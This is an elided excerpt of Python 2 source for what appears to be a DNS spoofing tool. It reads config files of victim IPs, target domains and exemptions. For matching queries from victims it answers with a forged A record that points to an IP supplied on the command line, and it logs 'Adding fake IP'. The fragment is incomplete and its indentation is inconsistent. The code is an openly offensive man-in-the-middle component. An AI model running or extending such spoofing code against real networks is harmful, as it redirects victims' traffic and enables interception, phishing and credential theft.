...
NOW=time.strftime("%Y-%m-%d_%I_%M")

LOGFOLDER = sys.argv[2]
LOGPREFIX=LOGFOLDER+NOW+"_"
LOGREQFILE = LOGPREFIX+"dnslog.txt"
LOGSNIFFFILE = LOGPREFIX+"snifflog.txt"
LOGALERTFILE = LOGPREFIX+"dnsalert.txt"
RESOLVCONF = working_path+"resolv.conf"

victim_file    = working_path+"victims.cfg"
nospoof_file   = working_path+"nospoof.cfg"
nospoofto_file = working_path+"nospoofto.cfg"
specific_file  = working_path+"spoof.cfg"
dominios_file  = working_path+"domains.cfg"
    ...
    for q in qs:
        ...
        if (host not in nospoof) and (prov_ip not in nospoofto) and (len(victims)==0 or prov_ip in victims):
                if specificspoof.has_key(host):
	                ...
	                dosleep = True
                        rrset = dns.rrset.from_text(q.name, ttl,dns.rdataclass.IN, dns.rdatatype.A, sys.argv[4])
                        print 'Adding fake IP = ' + sys.argv[4]
                        resp.answer.append(rrset)

        for ip in ips:
            DEBUGLOG('Adding real IP  = ' + ip.to_text())
